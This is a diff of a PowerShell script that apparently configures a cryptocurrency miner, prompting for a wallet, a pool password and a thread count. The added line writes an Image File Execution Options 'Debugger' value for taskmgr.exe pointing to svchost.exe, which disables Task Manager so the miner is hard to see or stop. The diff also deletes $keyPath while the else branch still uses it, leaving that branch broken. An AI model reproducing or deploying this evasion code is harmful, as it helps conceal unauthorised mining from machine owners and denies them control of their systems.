@@ -28,10 +28,9 @@ $wallet = Read-Host "Enter wallet address"
 $pass = Read-Host "Enter pool password"
 $threads = Read-Host "Enter thread count"
 $answer = Read-Host "Do you want to disable Task Manager"
-$keyPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe"
 
 if ($answer -eq "1") {
-    New-Item -Path $keyPath -Force | Out-Null
+    New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" -Force | Out-Null; New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" -Name "Debugger" -Value "%windir%\System32\svchost.exe" -PropertyType String -Force | Out-Null
 } else {
     Remove-Item -Path $keyPath -Recurse -Force -ErrorAction SilentlyContinue
 }
